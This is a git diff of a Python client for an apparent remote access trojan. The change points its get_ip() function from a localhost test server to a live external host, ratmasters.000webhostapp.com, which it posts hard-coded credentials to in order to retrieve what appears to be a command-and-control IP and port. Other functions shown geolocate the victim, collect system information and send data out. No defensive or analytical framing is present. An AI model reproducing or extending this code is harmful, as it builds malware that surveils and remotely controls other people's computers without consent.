@@ -9,13 +9,14 @@ import json
 import platform
 
 def get_ip():
+    """Find the ip address from webhost"""
     formdata = {
     'username': 'Pelle Peloton',
     'password': 'rotta',
     }
     
-    r = requests.post("http://localhost:8080/rat/index.php", data=formdata)
-    # r = requests.post("https://ratmasters.000webhostapp.com/", data=formdata)
+    #r = requests.post("http://localhost:8080/rat/index.php", data=formdata)
+    r = requests.post("https://ratmasters.000webhostapp.com/", data=formdata)
     bs = BeautifulSoup(r.text, 'html.parser')
     ip = bs.find('span', {'id':'ip'})
     port = bs.find('span', {'id':'port'})
@@ -57,6 +58,7 @@ def send_data(output_data):
 
 
 def geo():
+    """function to display geographic location based on ip address"""
     url = "https://ip-geo-location.p.rapidapi.com/ip/check"
     querystring = {"format":"json"}
     headers = {
@@ -72,6 +74,7 @@ Longitude:\t{testi['location']['longitude']}\n"""
     # print(response.text)
 
 def sysinfo():
+    """function to print system info"""
     # info = '{"hello":"moikka", "juu":"jee"}'
     # return info
     return f"""\nArchitecture:\t{platform.machine()}\nPlatform:\t{platform.platform()}
